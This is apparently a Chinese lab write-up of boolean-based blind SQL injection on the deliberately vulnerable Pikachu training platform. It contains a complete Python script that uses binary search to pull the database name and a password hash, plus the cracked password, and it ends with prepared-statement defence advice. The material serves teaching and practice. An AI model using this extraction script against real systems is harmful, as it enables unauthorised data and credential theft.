【Pikachu】Web-SQL-Inject 盲注(base on boolean) Writeup

操作者：何芊宏 | 操作日期：2026.9.28 | 分类：Pikachu | 标签：Pikachu, Web, SQL注入, 布尔盲注, Python, 二分查找, 编码陷阱

1. 题目信息

  • 平台：Pikachu 漏洞练习平台
  • 分类：Web - SQL-Inject
  • 题目名称：盲注(base on boolean)
  • 目标：在页面无数据回显、无报错信息的条件下，利用布尔逻辑判断，结合 Python 二分查找算法，自动化提取数据库名与管理员密码哈希。

2. 解题思路与知识点

漏洞原理：

布尔盲注是 SQL 注入的一种高级形式。该关卡的后端代码通过 `mysqli_num_rows($result)` 判断查询结果的行数，仅在页面回显“存在”或“不存在”两种状态。攻击者无法直接通过页面获取数据，但可以通过构造逻辑判断语句（如 `and 1=1`、`and 1=2`），利用页面的状态差异来推断数据库中的信息。为了提高效率，通常使用二分查找算法逐字猜解目标数据。

工具选型与心路历程：
  • 源码分析：通过查看 `sqli_blind_b.php` 源码，发现查询逻辑为 select id,email from member where username='$name'，且包含致命限制：mysqli_num_rows($result)==1。这意味着查询结果必须严格等于1行，否则页面会显示“不存在”。
  • 目标用户选择：由于 `vince` 在之前关卡中被多次篡改，导致其数据重复。使用 Python 查询 `member` 表，选取了唯一存在的用户 `allen` 进行测试。
  • 编码陷阱：在编写 Python 脚本时，遭遇了极其隐蔽的 URL 编码陷阱，导致长达数小时的排错。

3. 操作步骤

第一步：源码审计与关键信息提取

操作： 使用 VS Code 打开 `sqli_blind_b.php` 源码。

核心代码片段：

// 1. 接收参数，未做任何过滤
$name = $_GET['name'];
// 2. 直接拼接 SQL，查询 member 表
$query = "select id,email from member where username='$name'";
$result = mysqli_query($link, $query);
// 3. 致命限制：结果必须严格等于 1 行
if ($result && mysqli_num_rows($result)==1) {
    // 回显数据
} else {
    echo "您输入的username不存在，请重新输入！";
}

代码解析： 源码揭示了两个关键信息：查询表为 `member`，查询条件必须是 `username='$name'`。最关键的是 `mysqli_num_rows($result)==1` 这个限制，如果使用 `1=1` 导致查出多行，页面依然会报错，这就强制我们必须在 Payload 中使用 `and` 逻辑，并基于一个真实存在的用户名。

第二步：寻找真实可用的用户名

操作： 编写 `check_member.py` 查询数据库。

代码：

import pymysql
db = pymysql.connect(host='127.0.0.1', user='root', password='root', database='pikachu', charset='utf8')
cursor = db.cursor()
cursor.execute("SELECT username FROM member")
for row in cursor.fetchall():
    print(row[0])
db.close()

回显结果： 数据库中存在 `vince`, `allen`, `kobe`, `grady`, `kevin`, `lucy`, `lili`。由于 `vince` 被多次修改可能存在重复，我们选取唯一的 `allen` 作为攻击锚点。

第三步：自动化盲注脚本编写（含二分查找）

操作： 新建 `sqli_blind.py`，运行完整脚本。

完整代码：

import requests

url = "http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php"
real_username = "allen"  # 使用真实存在的用户名

def check_condition(condition):
    # 【核心修正】将 --+ 改为 -- （带空格），利用 requests 自动编码为 --%20
    payload = f"{real_username}' and {condition}-- "
    params = {"name": payload, "submit": "查询"}
    r = requests.get(url, params=params)
    return "your uid:" in r.text

def get_length(sql_query):
    for length in range(1, 50):
        if check_condition(f"length(({sql_query}))={length}"):
            return length
    return 0

def get_data(sql_query):
    length = get_length(sql_query)
    if length == 0: return ""
    result = ""
    for pos in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            if check_condition(f"ascii(substr(({sql_query}),{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid
        result += chr(low)
        print(f"[*] 正在猜解: {result}")
    return result

if __name__ == "__main__":
    print("[*] 开始提取数据库名...")
    db_name = get_data("select database()")
    print(f"[+] 成功提取到数据库名: {db_name}")

    print("\n[*] 开始提取第一个用户的密码...")
    pw_hash = get_data("select pw from member limit 0,1")
    print(f"[+] 成功提取到密码哈希: {pw_hash}")

代码解析：

  • check_condition：发送带有逻辑判断的 Payload。如果页面包含 your uid:，说明判断条件为真。
  • get_length：先猜解目标数据的长度（如数据库名长度为 7）。
  • get_data：二分查找核心逻辑。ASCII 码范围在 32-126 之间。每次取中间值 `mid`，询问数据库“字符的 ASCII 码是否大于 mid”。如果为真，说明目标在右半区，将 `low = mid + 1`；否则在左半区，将 `high = mid`。最多 7 次请求即可精准定位一个字符。

第四步：执行结果与 MD5 解密

回显结果：

  • 数据库名：[+] 成功提取到数据库名: pikachu
  • 密码哈希：[+] 成功提取到密码哈希: e10adc3949ba59abbe56e057f20f883e

解密验证： 将提取到的哈希 e10adc3949ba59abbe56e057f20f883e 放入 cmd5.com 进行查询，结果显示明文密码为 123456。

4. 踩坑记录与复盘

  • 坑1：源码限制导致查询结果异常。 源码中存在 mysqli_num_rows($result)==1，这意味着如果使用 or 1=1 会导致结果集超过 1 行，页面依然报“不存在”。解决方案是必须使用真实存在的唯一用户名（如 allen），并在 Payload 中用 and 连接逻辑。
  • 坑2：Python requests 的 URL 编码陷阱（致命）。 在构造 URL 参数时，Python 的 requests 库会将 + 编码为 %2B，而 MySQL 的注释符 -- 后必须跟空格才能生效。这导致 SQL 语法错误，页面始终返回“不存在”。解决方案是将 Payload 末尾的 --+ 改为 -- （带空格），此时 requests 会将其正确编码为 --%20，MySQL 即可正确注释尾部。
  • 坑3：盲注效率问题。 人工手动逐个字符测试效率极低。使用 Python 脚本配合二分查找算法，将每个字符的猜测次数从最多 95 次（遍历 ASCII）降低到最多 7 次，极大提升了自动化效率。

5. 知识总结

  • 布尔盲注核心： 在无回显、无报错的场景下，利用逻辑判断（and / or）和页面状态的差异来推断数据。
  • 二分查找算法： 在盲注中，通过 ascii(substr(...)) > mid 的方式快速缩小 ASCII 范围，是编写高效盲注脚本的必备技能。
  • 防御建议： 严格使用预编译语句（Prepared Statements）或参数化查询，确保参数与 SQL 语句代码分离；避免使用动态拼接字符串的方式执行 SQL。
